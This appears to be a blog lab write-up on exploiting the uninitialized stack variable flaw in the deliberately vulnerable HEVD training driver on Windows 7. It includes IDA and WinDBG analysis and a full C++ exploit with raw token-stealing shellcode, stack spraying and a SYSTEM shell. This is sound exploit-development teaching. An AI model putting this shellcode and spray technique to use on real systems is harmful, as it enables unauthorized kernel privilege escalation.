---
layout: single
title: HEVD - Windows 7 x86 Uninitialized Stack Variable - spraying the stack with pointer values 
---

This post covers the exploitation of the Uninitialized Stack Variable vulnerability class that resides within the HEVD third-party driver application.

## Understanding Uninitialized Stack Variable's

An uninitialized stack variable is a security vulnerability that occurs when a software developer defines a variable in their code but does not fully initialize it. 

And after the application starts running, the variable was declared but wasn't initialized. And now that data has an allocated memory location that is supposed to be held by the variable now may hold some sort of junk value since the variable has been allocated on the stack, and this allocated variables space is set aside and is left hanging.

This can be abused by an attacker. If an attacker can allocate something in the location where the uninitialized variable was left, the attacker can have their own data take its place. Similar to a use-after-free vulnerability, where you are taking advantage of the un-utilized aspects of something that wasn't set up properly. 

In some instances, the kernel, or ring-0 module may reference the uninitialized variable, which is where the exploitation comes into play. Where the attacker aims to control the trash bytes from the variable.

This vulnerability class can be found in MITREs CWE listing as CWE-457.

- https://cwe.mitre.org/data/definitions/457.html

## Proposed exploitation technique

The exploitation technique that threat actors and hackers will use to take advantage of this uninitialized variable vulnerability class, is that the attacker is going to attempt to spray the stack with pointers to their shellcode payload, in hopes that they can overwrite the location of the data from the variable, by doing so they can have a variable pointing to their own controlled data, and their controlled (inputted) data can be a pointer which points back to their shellcode payload.

In short, we can spray the stack with pointer's to our malicious shellcode payload in hopes that it fills the allocated space of the uninitialized variable's data, causing the variable to point to it. And if the victim driver (code) later uses this variable, it will act as a trigger for our shellcode pointer.

This vulnerability class is somewhat similar to a use-after-free vulnerability, where you attempt to spray objects into memory to have the dangling pointer from the freed object to point to your malicious payload. This is just a little bit different.

**Resources**

j00ru does a great job explaining a few kernel stack spraying techniques, which can be used to exploit an uninitialized variable, his post is here [https://j00ru.vexillium.org/2011/05/windows-kernel-stack-spraying-techniques/](https://j00ru.vexillium.org/2011/05/windows-kernel-stack-spraying-techniques/).

Also, thank you to **@h0mbre** for bringing up a good point in mentioning to me that pushing pointers for strings (printing to the terminal) as arguments can affect the stack, which can mess up your spray and exploitation.

## Source code and IDA analysis


The vulnerable code from HEVD for this vulnerability class comes from the `UninitializedStackVariable.c` source code file. We can see the secure and vulnerable code laid out nicely.

First, you can see the IOCTL handler function calls the `PAGED_CODE()` function and the userbuffer is being set up with the IRP requests and IOCTLs for a user-mode input buffer. This is just the basic I/O setup for the driver.

```c
NTSTATUS UninitializedStackVariableIoctlHandler(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
    PVOID UserBuffer = NULL;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    UNREFERENCED_PARAMETER(Irp);
    PAGED_CODE();
```

You can see it's counterpart in IDA below

![ioctl irp function](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/unint-variable/variable2.png)


Towards the end, Where the userbuffer get's moved into eax, and it does a jz test jmp, either it will call and trigger the trigger function, or it continues on.

Within IDA, in the `UninitializedStackVariableIoctlHandler` function you can see this also taking place.

You can see the void callback function calling the PAGED_CODE() function.

```
VOID UninitializedStackVariableObjectCallback() {
    PAGED_CODE();
```

You can see it's counterpart in IDA below

![callback function](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/unint-variable/variable1.png)

And you can see the MagicValue (which is important when triggering the initial BSOD) being set up with the value of `0xBAD0B0B0` when triggering the vulnerability, you need to make sure the UserValue you're going to give does not match this MagicValue.

```c
NTSTATUS TriggerUninitializedStackVariable(IN PVOID UserBuffer) {
    ULONG UserValue = 0;
    ULONG MagicValue = 0xBAD0B0B0;
    NTSTATUS Status = STATUS_SUCCESS;
```

The secure variable definition is very obvious in this area of the code, where the variable is properly initializing the variable as mapped to NULL, and it checks for the NULL pointer before conducting a callback.

```c
#ifdef SECURE
    UNINITIALIZED_STACK_VARIABLE UninitializedStackVariable = {0};
```

The vulnerable code is nicely shown, where it's a vanilla Uninitialized Stack Variable vulnerability because the developer wasn't properly initializing the variable (= { 0 }).

```c
#else
    UNINITIALIZED_STACK_VARIABLE UninitializedStackVariable;
#endif
```

This check is using the `ProbeForRead` function to check that the user provided buffer resides in the users address space, but if the `MagicValue` doesn't equal the `UserValue` (and the UserValue will equal the userbuffer), then it acts as a bypass for the check. And if this check is bypassed, the user buffer input is passed on. 

![magic value](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/unint-variable/variable3.png)

You can see this in IDA also, where the magicvalue is loaded into edx, compared against ebx (which is the uservalue), this is equivalent to the code below from the driver's source.

Where the conditional jz jump will use the `cmp ebx, edx`.
```c++
// Get the value from user mode
UserValue = *(PULONG)UserBuffer;

DbgPrint("[+] UserValue: 0x%p\n", UserValue);
DbgPrint("[+] UninitializedStackVariable Address: 0x%p\n", &UninitializedStackVariable);

// Validate the magic value
if (UserValue == MagicValue) {
    UninitializedStackVariable.Value = UserValue;
    UninitializedStackVariable.Callback = &UninitializedStackVariableObjectCallback;
}
```

And you can see it's making a call to dword prt [ebp-108h], which is where we want to spray out pointer to hit.

## Reversing the driver with IDA

To obtain the IOCTL for this vulnerability, we can take a look at the Dispatch Function (in this case it's called `IrpDeviceIoCtlHandler`).

![ioctl function jz](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/unint-variable/variable5.png)

After a failed jz between this and the NullPointer vulnerability function. You can see the jz to the `UninitializedStackVariableIoctlHandler` function, through the use of the `22202Bh` IOCTL, but before it does a `jz loc_16A27` (to the function with the `call    UninitializedStackVariableIoctlHandler`) you can see it's adding 4 to the eax value, and jumping to our function. So you can solve the IOCTL equation with `0x22202B + 0x4` which means our IOCTL for this vulnerability class will be `0x22202F`.

## Driver I/O and IOCTL communication

Now we can start our communication with the device driver since we have our IOCTL, and we know what to do. We need to use the IOCTL `0x22202F` and we also need to bypass the check with the MagicValue by including a buffer that is not `0xBAD0B0B0`, so we can utilize and provide a buffer of A's if we want to be classy.

```c++
#include <windows.h>
#include <iostream>

#define DEVICE_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL 0x22202F

int main(){
    std::cout << "[+] HEVD - Uninitialized Stack Variable Windows 7 x86 exploit POC\n\n";
    HANDLE hDevice = CreateFileA(DEVICE_NAME,
                                 GENERIC_READ | GENERIC_WRITE,
                                 FILE_SHARE_READ | FILE_SHARE_WRITE,
                                 NULL,
                                 OPEN_EXISTING,
                                 FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
                                 NULL);

    if (hDevice == INVALID_HANDLE_VALUE){
        std::cout << "[!] Failed to establish a device handler" << GetLastError() << std::endl;
    } else {
        std::cout << "[+] Established a handle to the device - " << DEVICE_NAME << std::endl;
    }

    DWORD sizeReturn = 0x0;
    char userBuffer[] = "\x41\x41\x41\x41";
    std::cout << "[+] Sending buffer of size: " << sizeof(userBuffer) << std::endl;
    DeviceIoControl(hDevice,
                    IOCTL,
                    &userBuffer,
                    sizeof(userBuffer),
                    NULL,
                    0,
                    &sizeReturn,
                    NULL);
}

```

The obvious thing to note from out IOCTL communication script is the buffer `char userBuffer[] = "\x41\x41\x41\x41";` which bypasses the MagicValue check of `0xBAD0B0B0`.

If you set a bp on the trigger function, you can hit it with this IOCTL

If you include your buffer as the magic value, you won't get an exception, if you include the A's payload, you hit the breakpoint.

```
kd> bp HEVD!TriggerUninitializedStackVariable
kd> g
Breakpoint 0 hit
HEVD!TriggerUninitializedStackVariable:
9997d2a0 68fc000000      push    0FCh
kd> g
```

## Spraying the stack

The technique we are going to use to spray the stack is using the `NtMapUserPhysicalPages` function.

```c++
BOOL MapUserPhysicalPages(
  PVOID      VirtualAddress,
  ULONG_PTR  NumberOfPages,
  PULONG_PTR PageArray
);
```

You can define this in our code, since finding a library for this doesn't seem likely (according to other blog posts)

```c++
typedef NTSTATUS(WINAPI *_NtMapUserPhysicalPages)(
    PINT BaseAddress,
    UINT32 NumberOfPages,
    PBYTE PageFrameNumbers);
```
And from here we just need to create a function to spray an allocated shellcode payloads pointer around throughout memory.

You can start by creating a variable to hold our shellcode payloads allocated pointer, our shellcode is like always, just use the EOP shellcode, and adjust any sort of fix towards the end if needs be.

`LPVOID shellcodePointerSpray = &shellcodePointer;` this get's a pointer to our shellcode payload.

You can then define the start address for our virtual addresses to spray, this is the `BaseAddress` member.

```c++
PVOID BaseAddress = 0;
char Page_Frame_Numbers[4096] = { 0 };
```

You can also set the page frame numbers, which will turn into the `PageFrameNumbers` member.

Now we can start our actual loop, which loops through memcpy to conduct the spray, I wanted to increment this twice, 0->512, and 512->1024, just in case something strange happens, we can see where the spraying doesn't work.

```c++
for (int i = 0; i < 512; i++)
{
    memcpy((Page_Frame_Numbers + (i * 4)), shellcodePointerSpray, 4);
}
std::cout << "\t[+] Spraying 512 pages" << std:endl

for (int i = 512; i < 1024; i++)
{
    memcpy((Page_Frame_Numbers + (i * 4)), shellcodePointerSpray, 4);
}
```
Then you can actually call the function, with our provided pointer to our virtual base address starting point, 1024 for the number of total pages we want to map (since we sprayed 1024). And then a pointer to our page frame number.

```c++
NtMapUserPhysicalPages(&BaseAddress,1024,(PBYTE)&Page_Frame_Numbers);
```

## Finalization and shellcode

Putting this all together will our shellcode, allocation of our shellcode with virtualalloc, our spraying, and the function to map the pages. We can have our final exploit code. 

```c++
#include <Windows.h>
#include <stdio.h>
#include <iostream>

#define DEVICE_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL 0x22202F

typedef NTSTATUS(WINAPI* _NtMapUserPhysicalPages)(
	PINT BaseAddress,
	UINT32 NumberOfPages,
	PBYTE PageFrameNumbers);


void spawnElevatedCmd() {
	std::cout << "[+] Successfully send buffer payload to the driver\n";
	std::cout << "[+] Spawning NT SYSTEM cmd prompt, enjoy!\n";

	STARTUPINFO StartupInfo;
	PROCESS_INFORMATION ProcessInformation;

	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	ZeroMemory(&ProcessInformation, sizeof(ProcessInformation));

	int aCreated = CreateProcessA("C:\\Windows\\System32\\cmd.exe",
		NULL,
		NULL,
		NULL,
		0,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&StartupInfo, &ProcessInformation);
	if (aCreated == FALSE) {
		std::cout << "[!] failed to launch process - " << GetLastError() << std::endl;

	}
}

int main() {
	std::cout << "[+] HEVD - Uninitialized Stack Variable Windows 7 x86 exploit POC\n\n";
	HANDLE hDevice = CreateFileA(DEVICE_NAME,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (hDevice == INVALID_HANDLE_VALUE) {
		std::cout << "[!] Failed to establish a device handler - " << GetLastError() << std::endl;
	}
	else {
		std::cout << "[+] Established a handle to the device - " << DEVICE_NAME << std::endl;
	}

	//-------------------------------------------------
	// our shellcode payload
	//-------------------------------------------------

	char shellcodePayload[] = (
		"\x60"
		"\x64\xA1\x24\x01\x00\x00"
		"\x8B\x40\x50"
		"\x89\xC1"
		"\x8B\x98\xF8\x00\x00\x00"
		"\xBA\x04\x00\x00\x00"
		"\x8B\x80\xB8\x00\x00\x00"
		"\x2D\xB8\x00\x00\x00"
		"\x39\x90\xB4\x00\x00\x00"
		"\x75\xED"
		"\x8B\x90\xF8\x00\x00\x00"
		"\x89\x91\xF8\x00\x00\x00"
		"\x61"
		"\x5d"
		"\xc2\x08\x00"
		);

	LPVOID shellcode_address = VirtualAlloc(NULL,
		sizeof(shellcodePayload),
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READWRITE);

	memcpy(shellcode_address, shellcodePayload, sizeof(shellcodePayload));
	std::cout << "[+] Shellcode allocated at " << std::hex << shellcode_address << std::endl;

	LPVOID shellcodePointerSpray = &shellcode_address;

	//-------------------------------------------------
	// stack spraying
	//-------------------------------------------------
	int BaseAddress = 0;
	char Page_Frame_Numbers[4096] = { 0 };
	for (int i = 0; i < 512; i++) {
		memcpy((Page_Frame_Numbers + (i * 4)), shellcodePointerSpray, 4);
	}
	std::cout << "\t[+] Spraying 512 pages" << std::endl;

	for (int i = 512; i < 1024; i++) {
		memcpy((Page_Frame_Numbers + (i * 4)), shellcodePointerSpray, 4);
	}
	std::cout << "\t[+] Sprayed 1024 pages" << std::endl;
	std::cout << "\t[+] Spraying is now complete" << std::endl;

	std::cout << "[+] Mapping the memory pages with NtMapUserPhysicalPages\n";
	_NtMapUserPhysicalPages NtMapUserPhysicalPages = (_NtMapUserPhysicalPages)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtMapUserPhysicalPages");
	// legit just found someone elses code for this that worked, tried to explain it the best to my ability on my blog post
	NtMapUserPhysicalPages(&BaseAddress, 1024, (PBYTE)&Page_Frame_Numbers);

	//-------------------------------------------------
	// stack spraying
	//-------------------------------------------------

	DWORD sizeReturn = 0x0;
	char userBuffer[] = "\x41\x41\x41\x41";
	std::cout << "[+] Sending final buffer of size: " << sizeof(userBuffer) << std::endl;
	int deviceCom = DeviceIoControl(hDevice,
		IOCTL,
		&userBuffer,
		sizeof(userBuffer),
		NULL,
		0,
		&sizeReturn,
		NULL);
	if (deviceCom) {
		spawnElevatedCmd();
	}
	else {
		std::cout << "[!] Failed to send payload to the device driver\n";
	}
}

```

## EOP and a shell

Like always, we can use the `DeviceIoControl` function combined with our userbuffer and discovered IOCTL, and handler to the driver to send our payload.

![image of EOP]()


## Conclusion

Conclusively, we were able to conduct a deep analysis of the driver's source code, all of the functions from HEVD for this vulnerability class. We discovered we needed to bypass the magic value to bypass the check. Once we did that, we discovered our IOCTL and did some basic IDA analysis to calculate it. We then were able to set our breakpoint in WinDBG and make sure our IOCTL communications worked. After all of this, we went into the exploitation phase, where we conducted a stack spray of pointers to our shellcode payload, hoping it will hit variables left over the allocation area. We then used the `NtMapUserPhysicalPages` function to map the pages we sprayed, triggering our vulnerability, and granted us a SYSTEM shell.

I would say that this is a very nice introduction to spraying techniques and the concept of throwing sprays around in your exploits, this can be used to further progress into a more difficult vulnerability class like pool overflows, and UAF vulnerabilities. Which both require a form of spraying.
